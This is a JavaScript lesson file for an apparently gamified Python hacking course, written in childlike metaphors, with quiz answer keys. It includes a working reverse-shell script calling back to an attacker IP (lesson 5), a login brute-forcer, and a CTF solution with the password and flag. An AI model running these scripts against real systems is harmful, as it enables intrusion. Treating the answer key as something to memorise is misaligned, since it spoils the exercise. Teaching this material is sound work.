const LESSONS = [
  {
    title: "1. Python Basics & Variables",
    points: 30,
    content: `<div class="htb-diagram-container"><img src="../../../assets/python_basics_diagram.png" alt="Python Basics & Variables" class="htb-diagram"></div>PLAYING WITH BOXES & LABELS: THE PYTHON ROBOT

Imagine you have a magical helper robot named Python! 🤖
Python is super friendly, but it has a very short memory. To help Python remember things, we use cardboard boxes and write labels on them. In computer talk, these labeled boxes are called 'variables'!

Here is how we tell Python to remember things:

ip_address = "192.168.1.50"   # A box holding a string of text
target_port = 80             # A box holding a number
is_active = True             # A box holding a yes/no switch (boolean)

If we want the robot to shout out what is inside a box, we tell it to 'print()':
print("[+] Target IP: " + ip_address)
print(f"[+] Scanning port: {target_port}")

#### Line-by-Line Code Explanation:
*   ip_address = "192.168.1.50": We grab a clean box, write the label ip_address on the outside, and put a paper strip with the text "192.168.1.50" inside it.
*   target_port = 80: We grab another box, write target_port on it, and drop the number block 80 inside.
*   is_active = True: We grab a third box, label it is_active, and flip the switch inside to True (which means "Yes!").
*   print("[+] Target IP: " + ip_address): We tell our robot helper to shout out the message. The + sign is like gluing our text together with whatever is inside the ip_address box.
*   print(f"[+] Scanning port: {target_port}"): The f prefix is like a magic window. It tells the robot to look inside the curly braces {}, find the box named target_port, read the number inside it, and shout it out as part of the sentence.

Types of Toys:
Python is smart enough to know what kind of toy is in each box. Text toys are called strings ('str'), and number toys are called integers ('int').
Sometimes, if you try to glue a number toy directly to a text toy, Python gets confused! So, we can convert a number to text using str(target_port) to make them match.

TASK: Help Python identify variables and print functions below!`,
    questions: [
      { q: "What built-in Python function is used to output text to the screen?", a: "print" },
      { q: "What is the standard file extension for Python scripts? (e.g., .txt)", a: ".py" },
      { q: "If you call type('123') in Python, what data type class is returned? (type: str/int/bool)", a: "str" }
    ]
  },
  {
    title: "2. Sockets & Port Scanning",
    points: 40,
    content: `<div class="htb-diagram-container"><img src="../../../assets/python_sockets_diagram.png" alt="Sockets & Port Scanning" class="htb-diagram"></div>KNOCKING ON APARTMENT DOORS: NETWORKING WITH SOCKETS

Imagine a computer is like a giant apartment building. 🏢
- The street address of the building is the IP Address.
- The individual apartment doors inside are called Ports.

If we want to find out which apartment doors are open to visitors, we need a special cup-and-string telephone. In Python, this telephone connection is called a 'socket'!

Here is how we scan a port using Python sockets:

import socket

target_host = "host.docker.internal"
target_port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2.0)

result = s.connect_ex((target_host, target_port))

if result == 0:
    print("[+] Knock knock! The door is OPEN!")
else:
    print("[-] Knock knock! No one answered. The door is closed.")

s.close()

#### Line-by-Line Code Explanation:
*   import socket: This opens our toy drawer and pulls out the "magic network walkie-talkies" box.
*   target_host = "host.docker.internal": This sets a box with the street address of the toy castle we want to call.
*   target_port = 80: This sets a box with the specific door number (door 80) we want to knock on.
*   s = socket.socket(...): We stretch out our cup-and-string telephone line to get ready to call.
*   s.settimeout(2.0): We set a timer. If we call them and they don't pick up in 2 seconds, we hang up so we don't wait forever.
*   result = s.connect_ex(...): We send our helper to knock on the door. connect_ex is a friendly knock. If the door opens, it hands our helper a green block (the number 0). If the door is locked, it hands a red block.
*   if result == 0:: We check if our helper brought back the green block (number 0).
*   print("[+] Knock knock! The door is OPEN!") / else: ...: If it's a green block, we shout that the door is open! Otherwise, we tell everyone it is closed.
*   s.close(): We roll up our cup-and-string telephone and put it away in the toy drawer.

Why connect_ex?
If we use standard connect() and a door is locked, our robot trips and falls down (raising an error!). But connect_ex() is polite: it just returns a secret code number. If it returns 0, it means 'Open Sesame!' — the port is open and we can connect!

TASK: Learn how sockets check for open ports and answer the questions.`,
    questions: [
      { q: "What built-in Python module handles network connections?", a: "socket" },
      { q: "What socket method attempts a connection and returns an integer instead of raising an error?", a: "connect_ex" },
      { q: "What integer value indicates a successful connection in connect_ex?", a: "0" }
    ]
  },
  {
    title: "3. HTTP Requests & Web Fuzzing",
    points: 40,
    content: `<div class="htb-diagram-container"><img src="../../../assets/python_http_diagram.png" alt="HTTP Requests & Web Fuzzing" class="htb-diagram"></div>ORDERING FOOD FROM THE RESTAURANT: WEB FUZZING

Imagine visiting a website is like going to a restaurant and ordering food. 🍔
When you want to see a web page, you send a GET request, which is like asking the waiter: "Can I please see the menu?"

The waiter will look in the kitchen and return a status code:
- Status 200: "Here you go!" (Successful!)
- Status 404: "Sorry, we don't have that!" (Not Found!)

Here is how we make a request in Python using the 'requests' library:

import requests

url = "http://host.docker.internal:5000/"
response = requests.get(url)

print(response.status_code)
print(response.text)

#### Line-by-Line Code Explanation:
*   import requests: We go to the closet and fetch our fast-running waiter helper named "Requests".
*   url = "http://host.docker.internal:5000/": We set the address of the kitchen table we want to order from.
*   response = requests.get(url): We tell our waiter to run to the kitchen table (GET request) and bring back everything they find, saving it all inside the response box.
*   print(response.status_code): We check what code the kitchen gave us. If it says 200, they gave us the food! If it says 404, they got lost or the food doesn't exist.
*   print(response.text): We open the food container and print out the actual recipe list (HTML source code) of the webpage.

What is Web Fuzzing?
Imagine a restaurant has a secret menu that they only show to VIPs, but they won't tell you the names of the dishes! To find them, you stand at the counter and rapidly guess words: "Is there a secret admin? Is there a secret login? Is there a secret robots.txt?"
Doing this automatically with a loop and a wordlist is called "fuzzing"!

TASK: Learn how HTTP status codes reveal hidden resources.`,
    questions: [
      { q: "What external Python library is the standard choice for making HTTP requests?", a: "requests" },
      { q: "What property of the response object contains the HTTP status code?", a: "status_code" },
      { q: "What HTTP response status code indicates a successful resource access?", a: "200" }
    ]
  },
  {
    title: "4. Automated Brute-Forcing",
    points: 50,
    content: `<div class="htb-diagram-container"><img src="../../../assets/python_bruteforce_diagram.png" alt="Automated Brute-Forcing" class="htb-diagram"></div>CRACKING THE TOY TREASURE CHEST: BRUTE-FORCING

Imagine you found a toy treasure chest with a lock that needs a combination. 🔒
Instead of twisting the dial slowly with your fingers, you build a super-fast mechanical finger that tries thousands of combinations every single second until the chest pops open! That is a brute-forcer.

When we try to log in to a web page, we submit a POST request, which is like handing the guard a filled-out form with our username and password.

Here is how we send a POST request with our guess:

import requests
url = "http://host.docker.internal:5000/admin-login"

payload = {
    "username": "admin",
    "password": "wrongpassword"
}

response = requests.post(url, data=payload)

if "Welcome" in response.text:
    print("[+] Access Granted!")
else:
    print("[-] Access Denied.")

#### Line-by-Line Code Explanation:
*   import requests: We call our waiter runner helper.
*   url = "http://...": We set the address of the castle gate control panel.
*   payload = { "username": "admin", "password": "wrongpassword" }: We write our name (admin) and our guess password on a post-it note card. This key-value list is called a dictionary.
*   response = requests.post(url, data=payload): We hand the post-it note card to our waiter, who runs to the gate and slides it into the slot (POST request), returning with a reply sheet.
*   if "Welcome" in response.text:: We look at the reply sheet. If it has the word "Welcome" written on it, we did it!
*   print("[+] Access Granted!") / else: ...: We celebrate if we got in, or write down a sad face if the guard rejected our guess password.

By looping through a list of passwords (a wordlist), we can test them in the blink of an eye!

TASK: Understand how POST requests can automate login attempts.`,
    questions: [
      { q: "Which HTTP request method is standard for submitting forms and login parameters?", a: "POST" },
      { q: "What keyword argument is used in requests.post() to send form-encoded data?", a: "data" },
      { q: "What Python collection type (key-value mapping) is used for the payload variable?", a: "dictionary" }
    ]
  },
  {
    title: "5. Python Reverse Shells",
    points: 40,
    content: `<div class="htb-diagram-container"><img src="../../../assets/python_revshell_diagram.png" alt="Python Reverse Shells" class="htb-diagram"></div>THROWING A ROPE OUT THE WINDOW: REVERSE SHELLS

Usually, if you want to control another computer, you try to connect to it from the outside. But what if the computer has a strong security shield (a firewall) that blocks all incoming visitors? 🛡️

To bypass this, we use a Reverse Shell!
Instead of you connecting to the computer, you get the target computer to connect back to you. This is like your friend throwing a rope out of their window down to your yard. Once the rope is in your hands, you can climb up or send commands straight into their room!

Here is the Python script that throws the rope:

import socket
import subprocess
import os

attacker_ip = "10.10.10.2"
attacker_port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((attacker_ip, attacker_port))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/sh", "-i"])

#### Line-by-Line Code Explanation:
*   import socket, subprocess, os: We open our trunk and grab three tool kits: a telephone kit (socket), a toy command room kit (subprocess), and a window-taping kit (os).
*   attacker_ip = "10.10.10.2" and attacker_port = 4444: We write down the attacker's yard address and walkie-talkie channel so the script knows where to throw the rope.
*   s = socket.socket(...): We tie a heavy knot on our rope (TCP network socket client).
*   s.connect((attacker_ip, attacker_port)): We throw the rope out of the window down to the attacker's yard!
*   os.dup2(s.fileno(), 0): We tape the computer's ears (Standard Input) to the rope. Now, anything the attacker whispers into the rope is heard by the computer.
*   os.dup2(s.fileno(), 1): We tape the computer's mouth (Standard Output) to the rope. Now, anything the computer says goes straight down the rope to the attacker.
*   os.dup2(s.fileno(), 2): We tape the computer's crying mouth (Standard Error) to the rope, so if it makes a mistake, the attacker hears that too.
*   subprocess.call(["/bin/sh", "-i"]): We open the control console inside the computer. Since ears and mouth are taped to our rope, the attacker can now run anything they want inside the computer!

By cloning the standard descriptors (0 for ears/stdin, 1 for mouth/stdout), the terminal now listens to commands coming over the socket network connection!

TASK: Learn how reverse shells pivot control and answer the questions.`,
    questions: [
      { q: "What standard module is used to spawn new processes and run system commands in Python?", a: "subprocess" },
      { q: "In a reverse shell, which system initiates the connection: victim or attacker?", a: "victim" },
      { q: "What file descriptor number represents standard input (stdin)?", a: "0" }
    ]
  },
  {
    title: "6. Practical Scripting Challenge",
    points: 60,
    content: `<div class="htb-diagram-container"><img src="../../../assets/python_challenge_diagram.png" alt="Practical Scripting Challenge" class="htb-diagram"></div>THE DETECTIVE MISSION: CAPTURING THE CASTLE FLAG

It is time to put on your detective hat and solve a real mystery! 🕵️‍♂️

Your Mission:
A mock corporate portal castle is running. You must write a Python script in your Kali machine to find the secret path, guess the password, and retrieve the flag.

Step-by-Step Instructions:
1. Spin up the "Target Server" and the "Kali Container" using the panels above.
2. Note the dynamic port number shown on the Target panel (let's assume it is PORT).
3. Inside your Kali machine, look for the secret door. Check what is disallowed by visiting the robots.txt file:
   curl http://host.docker.internal:PORT/robots.txt
4. This reveals the secret door path (hint: /admin-login).
5. Open a terminal editor to create your Python script file, or use a redirect to write it directly:

   Method A: Using Nano
   - Type: nano exploit.py
   - Paste the code template below, then save (Ctrl+O then Enter) and exit (Ctrl+X).

   Method B: Write directly with EOF redirect (recommended)
   Copy and paste this entire block directly into your Kali terminal command line:

cat << 'EOF' > exploit.py
import requests
url = "http://host.docker.internal:PORT/admin-login"
passwords = ['admin', '123456', 'password', 'pypower', 'letmein']
for p in passwords:
    r = requests.post(url, data={'username': 'admin', 'password': p})
    if "Flag" in r.text or r.status_code == 200:
        print(f"Success! Password is: {p}")
        print(r.text)
        break
EOF

   *** IMPORTANT: YOU MUST REPLACE PORT ***
   After creating the file, open it and replace the word PORT
   with the actual port number shown on the Target Server panel above.
   For example, if the panel says:
       "Target running! Access inside Kali at http://host.docker.internal:32771"
   Then run this command to fix the port:
       sed -i 's/PORT/32771/' exploit.py
   (Use whatever number YOUR panel shows, not 32771.)

6. Run your completed script using Python:
   python3 exploit.py

#### Line-by-Line Code Explanation:
*   import requests: Call our fast-running waiter helper.
*   url = "http://...": Write down the address of the locked chest control panel.
*   passwords = [...]: Fill a bag with key guesses we want to try: admin, 123456, password, etc.
*   for p in passwords:: Grab the bag of keys and try them one by one. The current key guess is named p.
*   r = requests.post(...): Put the key guess p in the keyhole and slide it in (POST request), getting back the chest's reply r.
*   if "Flag" in r.text or r.status_code == 200:: Check if the lock clicked open and revealed the secret paper inside, or if the light turned green (status code 200).
*   print(f"Success! Password is: {p}") and print(r.text): Shout out: "Aha! The key is pypower!" and print the secret code flag written inside the chest.
*   break: Stop trying keys from the bag because the chest is already open!

7. Retrieve the flag (format: CTF{...}).

TASK: Solve the challenge, find the path, password, and flag!`,
    questions: [
      { q: "What path contains the admin login form? (e.g. /login)", a: "/admin-login" },
      { q: "What is the correct password for the 'admin' account?", a: "pypower" },
      { q: "What flag was revealed inside the admin dashboard? (format: CTF{...})", a: "CTF{py_h4ck_succ3ss_9210}" }
    ]
  }
];
